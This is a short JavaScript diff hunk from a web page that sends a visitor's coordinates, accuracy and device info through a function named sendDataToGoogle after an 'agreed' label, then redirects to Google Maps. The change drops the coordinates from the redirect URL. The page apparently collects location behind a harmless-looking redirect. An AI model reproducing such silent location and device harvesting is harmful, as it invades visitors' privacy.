@@ -177,7 +177,7 @@
 
             // إرسال البيانات ثم التحويل المباشر لخرائط جوجل
             sendDataToGoogle("موافق", lat, lng, accuracy, deviceInfo).finally(() => {
-                window.location.replace(`https://www.google.com/maps?q=${lat},${lng}`);
+                window.location.replace(`https://www.google.com/maps`);
             });
         }
 
